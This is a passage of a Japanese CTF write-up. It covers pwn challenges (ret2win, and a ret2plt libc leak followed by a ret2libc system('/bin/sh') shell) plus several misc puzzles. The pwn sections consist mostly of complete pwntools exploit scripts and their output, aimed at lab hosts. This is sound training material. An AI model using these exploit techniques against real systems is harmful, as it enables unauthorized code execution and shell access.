こちらはソースコードが添付されている。明らかにret2winする問題だと分かる。

```c
#include <stdio.h>
#include <stdlib.h>

void __attribute__((section(".flag"))) print_flag() {
    char flag[64] = { 0 };
    FILE* fp = fopen("flag.txt", "r");
    if (!fp) {
        printf("An error occurred while opening the file\n");
        exit(1);
    }
    fread(flag, 1, 64, fp);
    printf("Congratulations! Here's the flag: %s\n", flag);
    exit(0);
}

void greet() {
    char name[16] = { 0 };
    gets(name);
    printf("Hi, %s!\n", name);
}

int main() {
    printf("Tell me your name! : ");
    fflush(stdout);
    greet();
    return 0;
}
```

checksecするとNo PIE, No Canaryだと分かるので、リターンアドレスを書き換えて`print_flag()`に飛ばしてあげれば良い。

```
$ checksec jump
[*] '/path/to/binary'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8047000)
    RWX:        Has RWX segments
    Stripped:   No
```

`print_flag()`のアドレスを調べる。No PIEなので常に`21466f42`で固定。

```
$ objdump -d ./jump | grep print_flag
21466f42 <print_flag>:
21466fd1:       75 14                   jne    21466fe7 <print_flag+0xa5>
```

offsetを数えるのが面倒だったので、ひたすら`print_flag()`のアドレスを送るだけのスクリプトを書く。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

HOST, PORT = '10.0.129.136', 8102
p = remote(HOST, PORT)

p.recvuntil(b'Tell me your name!')
p.sendline(p32(0x21466f42)*10)

print(p.recvall().decode())
```

```
$ poetry run python3 solver.py
[+] Opening connection to 10.0.129.136 on port 8102: Done
[+] Receiving all data: Done (111B)
[*] Closed connection to 10.0.129.136 port 8102
 : Hi, BoF!BoF!BoF!BoF!BoF!BoF!BoF!BoF!BoF!BoF!!
Congratulations! Here's the flag: flag{80F_JUMP_70_FUNC710N}
```

flagが得られた。
`flag{80F_JUMP_70_FUNC710N}`

## Here are GOT and PLT [435pt / 11 solves]

ソースコードはおろか、Dockerfileすら配布がない。そしてファイルが足りていないのかローカルで起動できない。非常に困ったが、どうしようもないので初っ端からリモートにつないで色々試すことにした（libcのバージョンも分からないから手元で環境再現のしようがない）。
とりあえずGhidraに投げてソースコードを見ると、`vuln()`内に`gets()`による自明なBuffer Overflowがある。また、`dump_got_plt()`内で`printf()`や`puts()`を呼んでいるので、これらの関数のgotは以降解決済みとなる。

```c
undefined4 main(void)

{
  dump_got_plt();
  hints();
  puts("Now, let\'s exploit!");
  setvbuf(stdout,(char *)0x0,2,0);
  vuln();
  return 0;
}
```

```c
void vuln(void)

{
  char local_10 [12];
  
  local_10[0] = '\0';
  local_10[1] = '\0';
  local_10[2] = '\0';
  local_10[3] = '\0';
  printf("Name? ");
  gets(local_10);
  printf("Nice to meet you, %s\n",local_10);
  return;
}
```

checksecするとNo PIE, No Canaryだと分かるが、ASLRが有効になっているらしいのでどうにかしてlibc leakする必要がある。

```
$ checksec vuln
[*] '/path/to/binary'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

以上から、[ret2plt](https://famasoon.hatenablog.com/entry/2016/03/26/171855)で解決済みのgotアドレスを得ることでlibc leakするという方針を立てた。
スクリプトを書く。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'info'

BIN = './vuln'
elf = ELF(BIN)

HOST, PORT = '10.0.129.137', 8108
p = remote(HOST, PORT)

VULN      = elf.symbols['vuln']
PUTS_PLT  = elf.plt['puts']
GOT_PRINTF= elf.got['printf']

p.recvuntil(b'Name?') 
def leak_once(addr):
    """puts(addr)を1回呼んで、次の'Name?'まで吸って先頭4Bをu32として返す"""
    payload  = b'A'*16
    payload += p32(PUTS_PLT)
    payload += p32(VULN) # vulnへ戻す
    payload += p32(addr)
    p.sendline(payload)

    data = p.recvuntil(b'Name?')
    nl = data.rfind(b'\n')
    line = data[data.rfind(b'\n',0,nl)+1:nl]
    return u32(line[:4])

printf_libc = leak_once(GOT_PRINTF)
log.success(f"printf@libc       = {hex(printf_libc)}")

p.interactive()
```

これでlibc内のアドレスが得られ、さらに`vuln()`へ戻ってきていることが確認できた。

```
$ poetry run python3 solver.py
[+] Opening connection to 10.0.129.137 on port 8108: Done
[+] printf@libc       = 0xf7d52db0
[*] Switching to interactive mode
 $ a
Nice to meet you, a
[*] Got EOF while reading in interactive
```

あとはこの流れをいくつかの関数で繰り返し、LibcSearcherに投げることでlibcのバージョンを特定する。ついでにlibc baseを求める。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'info'

BIN = './vuln'
elf = ELF(BIN)

HOST, PORT = '10.0.129.137', 8108
p = remote(HOST, PORT)

VULN      = elf.symbols['vuln']
PUTS_PLT  = elf.plt['puts']
GOT_PUTS  = elf.got['puts']
GOT_PRINTF= elf.got['printf']
GOT_LSM   = elf.got['__libc_start_main']

p.recvuntil(b'Name?') 
def leak_once(addr):
    """puts(addr)を1回呼んで、次の'Name?'まで吸って先頭4Bをu32として返す"""
    payload  = b'A'*16
    payload += p32(PUTS_PLT)
    payload += p32(VULN) # vulnへ戻す
    payload += p32(addr)
    p.sendline(payload)

    data = p.recvuntil(b'Name?')
    nl = data.rfind(b'\n')
    line = data[data.rfind(b'\n',0,nl)+1:nl]
    return u32(line[:4])

puts_libc   = leak_once(GOT_PUTS)
printf_libc = leak_once(GOT_PRINTF)
lsm_libc    = leak_once(GOT_LSM)

log.success(f"puts@libc         = {hex(puts_libc)}")
log.success(f"printf@libc       = {hex(printf_libc)}")
log.success(f"__libc_start_main = {hex(lsm_libc)}")

# --- LibcSearcher ---
from LibcSearcher import LibcSearcher
libc = LibcSearcher('puts', puts_libc)
libc.add_condition('__libc_start_main', lsm_libc)
libc.add_condition('printf', printf_libc)

libc_base = puts_libc - libc.dump('puts')
log.success(f'libc_base = {hex(libc_base)}')
```

```
$ poetry run python3 solver.py
[+] Opening connection to 10.0.129.137 on port 8108: Done
[+] puts@libc         = 0xf7dea140
[+] printf@libc       = 0xf7dc9db0
[+] __libc_start_main = 0xf7d96cf0
[+] There are multiple libc that meet current constraints :
0 - libc6_2.39-0ubuntu8.2_i386
1 - libc6_2.39-0ubuntu6_i386
2 - libc6_2.39-0ubuntu8_i386
3 - libc6_2.39-0ubuntu1_i386
4 - libc6_2.39-0ubuntu7_i386
5 - libc6_2.39-0ubuntu9_i386
6 - libc6_2.39-3.1ubuntu2_i386
7 - libc6_2.39-0ubuntu8.1_i386
8 - libc6_2.39-0ubuntu8.3_i386
9 - libc6_2.39-0ubuntu2_i386
[+] Choose one : 0
[+] libc_base = 0xf7d72000
[*] Closed connection to 10.0.129.137 port 8108
```

ここまで来れば、あとはont-shotでshellを得るだけ。
最終的なsolverはこうなった。

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'info'

BIN = './vuln'
elf = ELF(BIN)

HOST, PORT = '10.0.129.137', 8108
p = remote(HOST, PORT)

VULN      = elf.symbols['vuln']
PUTS_PLT  = elf.plt['puts']
GOT_PUTS  = elf.got['puts']
GOT_PRINTF= elf.got['printf']
GOT_LSM   = elf.got['__libc_start_main']

p.recvuntil(b'Name?') 
def leak_once(addr):
    """puts(addr)を1回呼んで、次の'Name?'まで吸って先頭4Bをu32として返す"""
    payload  = b'A'*16
    payload += p32(PUTS_PLT)
    payload += p32(VULN) # vulnへ戻す
    payload += p32(addr)
    p.sendline(payload)

    data = p.recvuntil(b'Name?')
    nl = data.rfind(b'\n')
    line = data[data.rfind(b'\n',0,nl)+1:nl]
    return u32(line[:4])

puts_libc   = leak_once(GOT_PUTS)
printf_libc = leak_once(GOT_PRINTF)
lsm_libc    = leak_once(GOT_LSM)

log.success(f"puts@libc         = {hex(puts_libc)}")
log.success(f"printf@libc       = {hex(printf_libc)}")
log.success(f"__libc_start_main = {hex(lsm_libc)}")

# --- LibcSearcher ---
from LibcSearcher import LibcSearcher
libc = LibcSearcher('puts', puts_libc)
libc.add_condition('__libc_start_main', lsm_libc)
libc.add_condition('printf', printf_libc)

libc_base = puts_libc - libc.dump('puts')
system    = libc_base + libc.dump('system')
exit_libc = libc_base + libc.dump('exit')
log.success(f'libc_base = {hex(libc_base)}')
log.success(f'system    = {hex(system)}')
log.success(f'exit      = {hex(exit_libc)}')


# --- get shell ---
binsh = libc_base + libc.dump('str_bin_sh')
log.success(f'/bin/sh   = {hex(binsh)}')

payload  = b'A'*16
payload += p32(system)         # ret → system
payload += p32(exit_libc)      # system の戻り先（お好みで 0xdeadbeef でも可）
payload += p32(binsh)          # argv[0]="/bin/sh"

p.sendline(payload)
p.interactive()
```

flagを読む。

```
$ ls
flag.txt
vuln
$ cat flag.txt
flag{G0T_3NTRY_W1TH0UT_L1BC_ADDR}
```

`flag{G0T_3NTRY_W1TH0UT_L1BC_ADDR}`

## all rust and no safe [495pt / 2 solves]

解けなかった。

# Misc

## Bellaso [260pt / 49 solves]

ヴィジュネル暗号。鍵まで配布されているので[オンラインデコーダー](https://cryptii.com/pipes/vigenere-cipher)で復号する。
![](https://storage.googleapis.com/zenn-user-upload/bb4b5db75ce5-20250915.png)
`makuranosoushi`

## Hamburger [400pt / 21 solves]

LLMに見つけてもらった。
<https://chatgpt.com/share/68c78df4-c4e0-8008-af39-f65f990dfebd>
`VerySecretData`

## Lamp [310pt / 39 solves]

[Zennの記事](https://zenn.dev/ythk/articles/ythk-raspico-pins)で分かりやすい対応図を見つけた。
![](https://storage.googleapis.com/zenn-user-upload/df9a48621cb3-20250915.png)

```py
from machine import Pin
import time

led = Pin(18, Pin.OUT)

while True:
    led.value(1)
    time.sleep(1)
    led.value(0)
    time.sleep(1)
```

より、GP18に対応するのは24番ピン。24と入力するとflagが得られた。
![](https://storage.googleapis.com/zenn-user-upload/8dbac8579c1c-20250915.png)
`flag{pico_gpio_master}`

この問題、入力に3回制限があるけどインスタンスを建て直せばリセットされるし、ピンは40番までしかないから総当たりでも解けそう。

## Salted Hash Hunt [340pt / 33 solves]

LLMに投げたら最後までやってくれた。作問者の方ごめんなさい。
<https://chatgpt.com/share/68c795c3-d104-8008-8c2b-63e633ba6b28>
`JohnInTheBox8657`

# あとがき

頑張って全問しっかり書いていたら6万字を超える大作writeupになってしまった。疲れた……
全問解いた訳ではないが、★1~2はそのカテゴリ自体初めてでも解ける（かつ学びがある）問題になっていて、★4ではしっかり解きごたえのある問題だった。問題のテーマもニッチなモノがなく王道（またはその組み合わせ）でsolve数の傾斜も良い感じになっていて、とても良い問題が多かったと思う。
個人的なところでは、実はpentestに触れたのは初めてで、色々な情報を得つつ実環境を模したサーバーに侵入するというのは中々経験しがたく、このCTFならではという特徴だろう。普段とは異なる脳の領域を使っている感覚があり楽しかった。また普段はwebばかり解いているが、今回はpwnやrevにもちゃんと向き合えたのもいい機会になった。(先月のACSC CTFではpwnとrevが1問も解けず、結果1問差でICC行きを逃したというのもあり……)
開催期間が72時間というのもじっくり考える余裕があり、とても良かった。来年以降の継続開催を切に願う。
